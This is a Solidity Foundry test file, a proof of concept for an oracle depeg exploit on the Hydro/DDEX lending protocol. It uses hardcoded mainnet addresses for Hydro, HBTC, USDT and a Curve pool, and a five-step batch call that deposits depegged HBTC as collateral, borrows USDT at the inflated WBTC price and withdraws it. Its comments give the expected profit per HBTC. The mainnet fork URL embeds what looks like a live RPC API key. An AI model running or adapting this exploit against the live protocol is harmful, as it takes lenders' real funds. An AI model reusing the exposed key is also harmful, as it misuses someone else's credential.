// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * @title HydroHBTCExploit
 * @notice PoC: HBTC oracle depeg exploit on Hydro/DDEX Protocol
 *
 * VULNERABILITY:
 * Hydro's HBTC oracle proxies WBTC Chainlink price, assuming 1:1 peg.
 * HBTC (Huobi BTC) has depegged to ~$23K vs ~$65K WBTC price (~64% discount).
 *
 * ATTACK: Deposit cheap HBTC → borrow USDT at inflated value → profit
 * NET PROFIT: ~$27K per HBTC deposited
 */
contract HydroHBTCExploit is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;

    uint16 constant MARKET_HBTC_USDT = 5;

    // Hydro batch Action struct (matches ABIEncoderV2 encoding)
    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }

    // batch((uint8,bytes)[]) selector
    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    function test_exploit_hbtc_oracle_depeg() public {
        address attacker = address(this);
        uint256 hbtcAmount = 1 ether; // 1 HBTC (18 decimals)
        uint256 borrowAmount = 50000 * 1e6; // 50,000 USDT (6 decimals)

        // Acquire HBTC - use vm.prank to transfer from Curve pool (has 2.055 HBTC)
        // In real attack: buy from Curve HBTC/WBTC pool at ~$23K/HBTC
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, hbtcAmount);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);

        console.log("=== Initial State ===");
        console.log("Attacker HBTC:", IERC20(HBTC).balanceOf(attacker) / 1e18);
        console.log("Attacker USDT:", usdtBefore / 1e6);
        console.log("Hydro USDT balance:", IERC20(USDT).balanceOf(HYDRO) / 1e6);

        // Approve HBTC to Hydro
        IERC20(HBTC).approve(HYDRO, hbtcAmount);

        // Build 5-step batch:
        // 1. Deposit HBTC → common balance
        // 2. Transfer HBTC → collateral (market 5)
        // 3. Borrow USDT from market 5
        // 4. Transfer USDT → common balance
        // 5. Withdraw USDT

        Action[] memory actions = new Action[](5);

        // Action 0: Deposit HBTC
        actions[0] = Action({
            actionType: 0, // Deposit
            encodedParams: abi.encode(HBTC, hbtcAmount)
        });

        // Action 1: Transfer HBTC from common to collateral
        // BalancePath = (uint8 category, uint16 marketID, address user)
        actions[1] = Action({
            actionType: 2, // Transfer
            encodedParams: abi.encode(
                HBTC,
                uint8(0), uint16(0), attacker,        // from: Common
                uint8(1), MARKET_HBTC_USDT, attacker,  // to: Collateral market 5
                hbtcAmount
            )
        });

        // Action 2: Borrow USDT
        actions[2] = Action({
            actionType: 3, // Borrow
            encodedParams: abi.encode(MARKET_HBTC_USDT, USDT, borrowAmount)
        });

        // Action 3: Transfer USDT from collateral to common
        actions[3] = Action({
            actionType: 2, // Transfer
            encodedParams: abi.encode(
                USDT,
                uint8(1), MARKET_HBTC_USDT, attacker,  // from: Collateral market 5
                uint8(0), uint16(0), attacker,          // to: Common
                borrowAmount
            )
        });

        // Action 4: Withdraw USDT
        actions[4] = Action({
            actionType: 1, // Withdraw
            encodedParams: abi.encode(USDT, borrowAmount)
        });

        // Execute batch
        bytes memory payload = abi.encodeWithSelector(BATCH_SEL, actions);
        (bool success, bytes memory ret) = HYDRO.call(payload);

        if (!success) {
            // Decode revert reason
            if (ret.length >= 68) {
                bytes memory stripped = new bytes(ret.length - 4);
                for (uint i = 4; i < ret.length; i++) {
                    stripped[i - 4] = ret[i];
                }
                string memory reason = abi.decode(stripped, (string));
                console.log("Revert reason:", reason);
            } else if (ret.length > 0) {
                console.logBytes(ret);
            }
            revert("Batch call failed");
        }

        // Results
        uint256 usdtAfter = IERC20(USDT).balanceOf(attacker);
        uint256 hbtcAfter = IERC20(HBTC).balanceOf(attacker);
        uint256 usdtGained = usdtAfter - usdtBefore;

        console.log("=== After Exploit ===");
        console.log("Attacker HBTC remaining:", hbtcAfter / 1e18);
        console.log("USDT extracted:", usdtGained / 1e6);
        console.log("=== Profit (assuming HBTC bought at $23K) ===");
        console.log("Revenue (USDT):", usdtGained / 1e6);
        console.log("Cost (HBTC):", uint256(23000));

        // Assertions
        assertEq(hbtcAfter, 0, "HBTC should be deposited");
        assertGt(usdtGained, 0, "Should have gained USDT");
        assertGt(usdtGained / 1e6, 23000, "Profit should exceed HBTC cost");
    }
}
